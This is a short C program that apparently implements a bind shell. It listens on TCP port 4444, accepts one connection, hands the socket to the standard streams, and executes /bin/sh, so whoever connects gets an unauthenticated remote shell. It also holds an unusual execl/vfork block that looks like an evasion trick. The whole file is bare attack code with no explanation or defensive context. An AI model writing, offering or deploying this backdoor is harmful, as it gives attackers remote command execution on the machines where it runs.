#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <unistd.h>

#define PORT 4444

int main()
{ 
	int fd, cfd;
	struct sockaddr_in server_addr;
        
	fd = socket(AF_INET, SOCK_STREAM, 0);
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	server_addr.sin_addr.s_addr = 0; //htonl(INADDR_ANY);

	bind(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
	listen(fd, 5);
	cfd = accept(fd, 0, 0);

	if(execl(NULL, NULL, NULL) < 0 && errno == ENOTSUP)
	{
		vfork();
	}

	dup2(cfd, 0); 
	dup2(cfd, 1); 
	dup2(cfd, 2);

	execl("/bin/sh", NULL, NULL);
	
	return 0;
}

